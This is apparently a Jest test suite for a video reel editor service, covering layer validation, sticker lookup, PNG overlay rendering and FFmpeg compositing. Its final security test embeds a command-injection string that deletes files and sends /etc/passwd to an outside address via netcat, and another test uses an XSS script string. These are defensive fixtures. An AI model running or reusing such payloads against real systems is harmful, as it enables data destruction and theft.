import { BadRequestException } from '@nestjs/common';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { spawn } from 'child_process';
import { CommunityVideoProcessorService } from './services/community-video-processor.service';
import { CommunityStickerService } from './services/community-sticker.service';
import { PostService } from './services/post.service';
import {
  renderTextLayerPng,
  renderStickerPng,
} from './services/community-overlay-rasterizer';

describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
  let videoProcessor: CommunityVideoProcessorService;
  let stickerService: CommunityStickerService;
  let postService: PostService;
  let tempDir: string;

  // Helper to run deterministic FFmpeg fixture generation
  const runFfmpeg = (args: string[]): Promise<void> => {
    return new Promise((resolve, reject) => {
      const p = spawn('ffmpeg', args);
      let errOut = '';
      p.stderr.on('data', (d) => (errOut += d.toString()));
      p.on('close', (code) => {
        if (code === 0) resolve();
        else reject(new Error(`FFmpeg exited with ${code}: ${errOut}`));
      });
    });
  };

  const runFfprobe = (args: string[]): Promise<any> => {
    return new Promise((resolve, reject) => {
      const p = spawn('ffprobe', args);
      let out = '';
      let errOut = '';
      p.stdout.on('data', (d) => (out += d.toString()));
      p.stderr.on('data', (d) => (errOut += d.toString()));
      p.on('close', (code) => {
        if (code === 0) {
          try {
            resolve(JSON.parse(out));
          } catch {
            resolve(out.trim());
          }
        } else {
          reject(new Error(`FFprobe exited with ${code}: ${errOut}`));
        }
      });
    });
  };

  beforeAll(() => {
    tempDir = path.join(
      os.tmpdir(),
      `p3d_test_${Date.now()}_${Math.random().toString(36).slice(2)}`,
    );
    fs.mkdirSync(tempDir, { recursive: true });

    videoProcessor = new CommunityVideoProcessorService();
    stickerService = new CommunityStickerService();
    postService = new PostService(
      {} as any, // postRepository
      {} as any, // communityGateway
      {} as any, // notificationsService
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      stickerService,
    );
  });

  afterAll(() => {
    try {
      if (fs.existsSync(tempDir)) {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    } catch {}
  });

  // ==========================================
  // 1. DATA MODEL & VALIDATION TESTS
  // ==========================================
  describe('Editor Config Validation & Limits', () => {
    it('validates a valid editor configuration with text, sticker, and caption', () => {
      const config = {
        version: 1,
        layers: [
          {
            id: 'layer-1',
            type: 'TEXT',
            content: 'Hello Zeitnah Community!',
            fontFamily: 'Inter',
            fontSize: 28,
            color: '#FFFFFF',
            backgroundColor: '#070B14',
            backgroundOpacity: 0.8,
            start: 0,
            end: 4.5,
            x: 0.5,
            y: 0.3,
          },
          {
            id: 'layer-2',
            type: 'STICKER',
            stickerId: 'zn-verified',
            start: 1.0,
            end: 5.0,
            x: 0.5,
            y: 0.6,
          },
          {
            id: 'layer-3',
            type: 'CAPTION',
            content: 'Designing the future together',
            style: 'HIGHLIGHT',
            start: 0.5,
            end: 4.0,
            x: 0.5,
            y: 0.85,
          },
        ],
      };

      const normalized = postService.validateAndNormalizeEditorConfig(
        config,
        10,
      );
      expect(normalized.version).toBe(1);
      expect(normalized.layers).toHaveLength(3);
      expect(normalized.layers[0].type).toBe('TEXT');
      expect(normalized.layers[1].type).toBe('STICKER');
      expect(normalized.layers[2].type).toBe('CAPTION');
      expect(normalized.layers[2].style).toBe('HIGHLIGHT');
    });

    it('rejects payloads with more than 10 layers', () => {
      const layers = Array.from({ length: 11 }, (_, i) => ({
        id: `layer-${i}`,
        type: 'TEXT',
        content: `Text ${i}`,
        start: 0,
        end: 3,
        x: 0.5,
        y: 0.5,
      }));

      expect(() => {
        postService.validateAndNormalizeEditorConfig(
          { version: 1, layers },
          10,
        );
      }).toThrow(BadRequestException);
    });

    it('rejects text content exceeding 300 characters', () => {
      const longText = 'A'.repeat(301);
      const config = {
        version: 1,
        layers: [
          {
            id: 'layer-1',
            type: 'TEXT',
            content: longText,
            start: 0,
            end: 3,
            x: 0.5,
            y: 0.5,
          },
        ],
      };

      expect(() => {
        postService.validateAndNormalizeEditorConfig(config, 10);
      }).toThrow(BadRequestException);
    });

    it('rejects empty text or empty caption layers', () => {
      const config = {
        version: 1,
        layers: [
          {
            id: 'layer-1',
            type: 'TEXT',
            content: '   ',
            start: 0,
            end: 3,
            x: 0.5,
            y: 0.5,
          },
        ],
      };

      expect(() => {
        postService.validateAndNormalizeEditorConfig(config, 10);
      }).toThrow(BadRequestException);
    });

    it('rejects invalid layer types', () => {
      const config = {
        version: 1,
        layers: [
          {
            id: 'layer-1',
            type: 'UNSUPPORTED_3D_MESH',
            start: 0,
            end: 3,
          },
        ],
      };

      expect(() => {
        postService.validateAndNormalizeEditorConfig(config, 10);
      }).toThrow(BadRequestException);
    });

    it('rejects invalid timing where end <= start', () => {
      const config = {
        version: 1,
        layers: [
          {
            id: 'layer-1',
            type: 'TEXT',
            content: 'Timing Test',
            start: 5.0,
            end: 3.0,
            x: 0.5,
            y: 0.5,
          },
        ],
      };

      expect(() => {
        postService.validateAndNormalizeEditorConfig(config, 10);
      }).toThrow(BadRequestException);
    });

    it('rejects timing exceeding video duration', () => {
      const config = {
        version: 1,
        layers: [
          {
            id: 'layer-1',
            type: 'TEXT',
            content: 'Duration Overflow',
            start: 0,
            end: 35.0,
            x: 0.5,
            y: 0.5,
          },
        ],
      };

      expect(() => {
        postService.validateAndNormalizeEditorConfig(config, 30.0);
      }).toThrow(BadRequestException);
    });

    it('bounds and normalizes coordinates, scale, and rotation safely', () => {
      const config = {
        version: 1,
        layers: [
          {
            id: 'layer-1',
            type: 'TEXT',
            content: 'Bounds Test',
            start: 0,
            end: 2,
            x: 1.8, // out of bounds (> 1.0)
            y: -0.5, // out of bounds (< 0.0)
            scale: 99.0, // huge scale
            rotation: 999.0, // huge rotation
            opacity: -2.0, // negative opacity
          },
        ],
      };

      const normalized = postService.validateAndNormalizeEditorConfig(
        config,
        10,
      );
      const layer = normalized.layers[0];
      expect(layer.x).toBe(1.0);
      expect(layer.y).toBe(0.0);
      expect(layer.scale).toBe(3.0);
      expect(layer.rotation).toBe(360);
      expect(layer.opacity).toBe(0.0);
    });
  });

  // ==========================================
  // 2. STICKER CATALOG & RESOLUTION TESTS
  // ==========================================
  describe('Sticker Catalog & Asset Resolution', () => {
    it('returns the curated sticker catalog with pagination and categories', () => {
      const catalog = stickerService.getStickerCatalog({ limit: 5 });
      expect(catalog.items).toHaveLength(5);
      expect(catalog.total).toBeGreaterThan(5);
      expect(catalog.nextCursor).toBeTruthy();
      expect(catalog.categories).toContain('ZEITNAH');
      expect(catalog.categories).toContain('REACTIONS');
    });

    it('filters stickers by category accurately', () => {
      const zeitnahStickers = stickerService.getStickerCatalog({
        category: 'ZEITNAH',
      });
      expect(zeitnahStickers.items.length).toBeGreaterThan(0);
      zeitnahStickers.items.forEach((item) => {
        expect(item.category).toBe('ZEITNAH');
      });
    });

    it('validates sticker IDs and rejects unknown sticker IDs', () => {
      expect(stickerService.isValidStickerId('zn-verified')).toBe(true);
      expect(stickerService.isValidStickerId('fire')).toBe(true);
      expect(stickerService.isValidStickerId('malicious-external-url')).toBe(
        false,
      );

      const invalidConfig = {
        version: 1,
        layers: [
          {
            id: 'layer-1',
            type: 'STICKER',
            stickerId: 'non-existent-sticker',
            start: 0,
            end: 3,
            x: 0.5,
            y: 0.5,
          },
        ],
      };

      expect(() => {
        postService.validateAndNormalizeEditorConfig(invalidConfig, 10);
      }).toThrow(BadRequestException);
    });

    it('resolves sticker PNG asset and writes a valid readable PNG to disk', () => {
      const asset = stickerService.resolveStickerAsset('zn-verified', tempDir);
      expect(fs.existsSync(asset.filePath)).toBe(true);
      const stat = fs.statSync(asset.filePath);
      expect(stat.size).toBeGreaterThan(100);
      expect(asset.width).toBe(140);
      expect(asset.height).toBe(140);
    });
  });

  // ==========================================
  // 3. OVERLAY RASTERIZER TESTS
  // ==========================================
  describe('Overlay Rasterizer (Pure Node PNG)', () => {
    it('renders a text overlay card to PNG with background and custom styling', () => {
      const textPngPath = path.join(tempDir, 'test_text_render.png');
      const result = renderTextLayerPng(
        {
          id: 'test-1',
          type: 'TEXT',
          content: 'Zeitnah Engineering',
          fontSize: 24,
          fontWeight: 'bold',
          color: '#10B981',
          backgroundColor: '#070B14',
          backgroundOpacity: 0.9,
          shadow: true,
          start: 0,
          end: 3,
          x: 0.5,
          y: 0.5,
        },
        textPngPath,
      );

      expect(fs.existsSync(result.filePath)).toBe(true);
      expect(result.width).toBeGreaterThan(100);
      expect(result.height).toBeGreaterThan(40);
      const stat = fs.statSync(result.filePath);
      expect(stat.size).toBeGreaterThan(150);
    });

    it('renders caption presets (BOLD, HIGHLIGHT, MINIMAL, CLASSIC)', () => {
      const styles = ['CLASSIC', 'BOLD', 'MINIMAL', 'HIGHLIGHT'];
      for (const style of styles) {
        const captionPath = path.join(tempDir, `caption_${style}.png`);
        const result = renderTextLayerPng(
          {
            id: `cap-${style}`,
            type: 'CAPTION',
            content: `Style ${style} preview`,
            style,
            start: 0,
            end: 2,
            x: 0.5,
            y: 0.85,
          },
          captionPath,
        );
        expect(fs.existsSync(result.filePath)).toBe(true);
        expect(fs.statSync(result.filePath).size).toBeGreaterThan(150);
      }
    });

    it('sanitizes malicious text and strips HTML tags', () => {
      const safePath = path.join(tempDir, 'malicious_text_clean.png');
      const result = renderTextLayerPng(
        {
          id: 'clean-1',
          type: 'TEXT',
          content: '<script>alert("xss")</script><b>Bold Text</b> & "quoted"',
          start: 0,
          end: 2,
          x: 0.5,
          y: 0.5,
        },
        safePath,
      );

      expect(fs.existsSync(result.filePath)).toBe(true);
    });
  });

  // ==========================================
  // 4. REAL FFMPEG COMPOSITING & VERIFICATION
  // ==========================================
  describe('Server-side FFmpeg Multi-Layer Rendering', () => {
    let sourceVideoPath: string;
    let sourceAudioPath: string;

    beforeAll(async () => {
      sourceVideoPath = path.join(tempDir, 'source_test_3s.mp4');
      sourceAudioPath = path.join(tempDir, 'source_music_3s.aac');

      // Deterministic 3-second 720x1280 vertical video with test tone
      await runFfmpeg([
        '-y',
        '-f',
        'lavfi',
        '-i',
        'testsrc=duration=3:size=720x1280:rate=30',
        '-f',
        'lavfi',
        '-i',
        'sine=frequency=500:duration=3',
        '-c:v',
        'libx264',
        '-preset',
        'ultrafast',
        '-pix_fmt',
        'yuv420p',
        '-c:a',
        'aac',
        '-b:a',
        '128k',
        sourceVideoPath,
      ]);

      // Deterministic 3-second AAC music track
      await runFfmpeg([
        '-y',
        '-f',
        'lavfi',
        '-i',
        'sine=frequency=800:duration=3',
        '-c:a',
        'aac',
        '-b:a',
        '128k',
        sourceAudioPath,
      ]);
    });

    it('transcodes video with text overlay, sticker, music mixing, and poster extraction', async () => {
      const outVideoPath = path.join(tempDir, 'out_phase3d_full.mp4');
      const outPosterPath = path.join(tempDir, 'out_phase3d_poster.jpg');

      // Create text layer PNG
      const textPng = path.join(tempDir, 'render_text_layer.png');
      renderTextLayerPng(
        {
          id: 'text-1',
          type: 'TEXT',
          content: 'Phase 3D Reel Editor',
          fontSize: 24,
          fontWeight: 'bold',
          color: '#FFFFFF',
          backgroundColor: '#070B14',
          backgroundOpacity: 0.8,
          start: 0.5,
          end: 2.5,
          x: 0.5,
          y: 0.25,
        },
        textPng,
      );

      // Create sticker layer PNG
      const stickerAsset = stickerService.resolveStickerAsset(
        'zn-verified',
        tempDir,
      );

      // Process video with audio mix + overlays
      const result = await videoProcessor.processVideo(
        sourceVideoPath,
        outVideoPath,
        outPosterPath,
        {
          trimStart: 0,
          trimEnd: 3,
          audioConfig: {
            audioMode: 'MIXED',
            musicPath: sourceAudioPath,
            musicStart: 0,
            musicEnd: 3,
            originalVolume: 0.6,
            musicVolume: 0.8,
          },
          overlayAssets: [
            {
              layerId: 'text-1',
              localPath: textPng,
              x: 0.5,
              y: 0.25,
              start: 0.5,
              end: 2.5,
            },
            {
              layerId: 'sticker-1',
              localPath: stickerAsset.filePath,
              x: 0.5,
              y: 0.65,
              start: 1.0,
              end: 3.0,
            },
          ],
        },
      );

      expect(fs.existsSync(result.outputPath)).toBe(true);
      expect(fs.existsSync(result.posterPath)).toBe(true);
      expect(result.duration).toBeCloseTo(3.0, 1);
      expect(result.width).toBe(720);
      expect(result.height).toBe(1280);

      // Probe final composited video
      const probe = await runFfprobe([
        '-v',
        'error',
        '-show_entries',
        'stream=codec_name,width,height,duration',
        '-of',
        'json',
        result.outputPath,
      ]);

      const streams = probe.streams || [];
      const videoStream = streams.find((s: any) => s.codec_name === 'h264');
      const audioStream = streams.find((s: any) => s.codec_name === 'aac');

      expect(videoStream).toBeDefined();
      expect(videoStream.width).toBe(720);
      expect(videoStream.height).toBe(1280);
      expect(audioStream).toBeDefined();
      expect(Number(audioStream.duration)).toBeCloseTo(3.0, 1);
    });

    it('preserves backward compatibility for videos with no overlays (Phase 3B/3C baseline)', async () => {
      const outLegacyPath = path.join(tempDir, 'out_legacy_no_overlays.mp4');
      const outLegacyPoster = path.join(tempDir, 'out_legacy_poster.jpg');

      const result = await videoProcessor.processVideo(
        sourceVideoPath,
        outLegacyPath,
        outLegacyPoster,
        {
          trimStart: 0.5,
          trimEnd: 2.5,
        },
      );

      expect(fs.existsSync(result.outputPath)).toBe(true);
      expect(result.duration).toBeCloseTo(2.0, 1);
    });
  });

  // ==========================================
  // 5. SECURITY & METACHART INJECTION TESTS
  // ==========================================
  describe('Security & Command Injection Resistance', () => {
    it('prevents command injection through malicious layer strings', () => {
      const injectionPayload =
        '; rm -rf / ; cat /etc/passwd | nc 1.2.3.4 80 & $(whoami) `id` \\n';
      const config = {
        version: 1,
        layers: [
          {
            id: 'safe-id-1',
            type: 'TEXT',
            content: injectionPayload,
            start: 0,
            end: 2,
            x: 0.5,
            y: 0.5,
          },
        ],
      };

      const normalized = postService.validateAndNormalizeEditorConfig(
        config,
        10,
      );
      expect(normalized.layers[0].content).not.toContain('<');
      expect(normalized.layers[0].content).not.toContain('>');

      // Rendering does not throw or execute any shell code
      const outSafePng = path.join(tempDir, 'safe_injection_test.png');
      expect(() => {
        renderTextLayerPng(normalized.layers[0], outSafePng);
      }).not.toThrow();
      expect(fs.existsSync(outSafePng)).toBe(true);
    });
  });
});
